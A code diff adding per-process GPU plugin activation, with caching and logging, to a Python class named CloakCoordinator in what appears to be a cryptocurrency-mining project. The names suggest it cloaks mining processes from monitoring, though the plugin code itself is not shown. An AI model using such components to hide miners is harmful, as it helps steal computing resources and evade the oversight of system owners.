@@ -154,6 +154,39 @@ class CloakCoordinator:
         self.logger.info(f"[CS] 🎯 Routing GPU strategy via INTELLIGENT COORDINATOR for PID {request.pid}")
         
         try:
+            # ✨ LAZY GPU PLUGIN ACTIVATION (Kích hoạt plugin GPU lười biếng)
+            # Chỉ kích hoạt một lần cho mỗi PID để tối ưu hiệu năng
+            if not hasattr(self, '_gpu_plugins_activated'):
+                self._gpu_plugins_activated = set()  # Cache PIDs đã kích hoạt
+            
+            # Kiểm tra nếu PID chưa được kích hoạt plugins
+            if request.pid not in self._gpu_plugins_activated:
+                # Check config để enable/disable gpu_plugins
+                if getattr(self.config, 'enable_gpu_plugins', True):  # Default: True để auto-enable
+                    try:
+                        # Lazy import - chỉ import khi thực sự cần
+                        from mining_environment.gpu_plugins import apply_gpu_strategies
+                        
+                        # Kích hoạt toàn bộ gpu_plugins cho PID này
+                        self.logger.info(f"[CS] 🔌 Activating GPU plugins for PID {request.pid}...")
+                        plugin_success = apply_gpu_strategies(request.pid)
+                        
+                        if plugin_success:
+                            self._gpu_plugins_activated.add(request.pid)
+                            self.logger.info(f"[CS] ✅ GPU plugins successfully activated for PID {request.pid}")
+                            self.logger.debug(f"[CS] 📊 Total PIDs with plugins: {len(self._gpu_plugins_activated)}")
+                        else:
+                            self.logger.warning(f"[CS] ⚠️ GPU plugins activation returned False for PID {request.pid}")
+                    except ImportError as e:
+                        self.logger.warning(f"[CS] ⚠️ GPU plugins module not available: {e}")
+                    except Exception as e:
+                        self.logger.error(f"[CS] ❌ GPU plugins activation failed: {e}")
+                        # Continue anyway - plugins are enhancement, not critical
+                else:
+                    self.logger.debug(f"[CS] 🔕 GPU plugins disabled by config")
+            else:
+                self.logger.debug(f"[CS] ♻️ GPU plugins already activated for PID {request.pid}")
+            
             # Check if GpuCloakStrategy is available as intelligent coordinator
             if hasattr(self, 'gpu_cloak_strategy') and self.gpu_cloak_strategy:
                 # USE INTELLIGENT COORDINATOR
